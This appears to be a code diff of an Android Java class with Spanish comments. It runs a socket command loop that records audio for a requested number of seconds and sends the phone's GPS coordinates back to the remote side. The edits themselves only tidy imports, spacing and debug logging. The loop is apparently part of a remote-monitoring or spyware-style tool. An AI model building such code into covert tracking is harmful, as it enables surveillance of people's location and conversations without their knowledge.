@@ -8,7 +8,7 @@ import java.io.BufferedReader;
 import java.io.IOException;
 import java.io.InputStreamReader;
 
-import Controlador.GPSPacket;
+import Controlador.*;
 
 public class bucle extends AsyncTask<Void, Integer, Boolean> {// cosas de entrada, forma que voy a indicar el progreso, lo que devuelvo
     SocketManager socket;
@@ -44,7 +44,7 @@ public class bucle extends AsyncTask<Void, Integer, Boolean> {// cosas de entrad
                         } catch (IOException e) {
                             e.printStackTrace();
                         }
-                    } else if (resp .equals("audio")) {
+                    } else if (resp.equals("audio")) {
                         try {
                             String numero = socket.Leer();
                             int segs = Integer.parseInt(numero);// numero de segundos que se quiere grabar
@@ -62,19 +62,12 @@ public class bucle extends AsyncTask<Void, Integer, Boolean> {// cosas de entrad
 
                     } else if (resp.equals("sms")) {
                         // opcion 3
-                        byte[] datos = new byte[11];
 
-                        try {
-                            socket.sendBytes(datos,datos.length);
-                        } catch (IOException e) {
-                            e.printStackTrace();
-                        }
+
                     }else if (resp.equals("gps")) {
-                        Log.i("aqui entra","aqui");
                         try {
                             GPSPacket gps = new GPSPacket();
                             String location= "Latitud: "+gps.getLatitude()+"Longitud: "+ gps.getLongitude();
-                            Log.i("Locationnnn",location);
                             socket.Escribir(location+ '\n');
                         } catch (IOException e) {
                             e.printStackTrace();
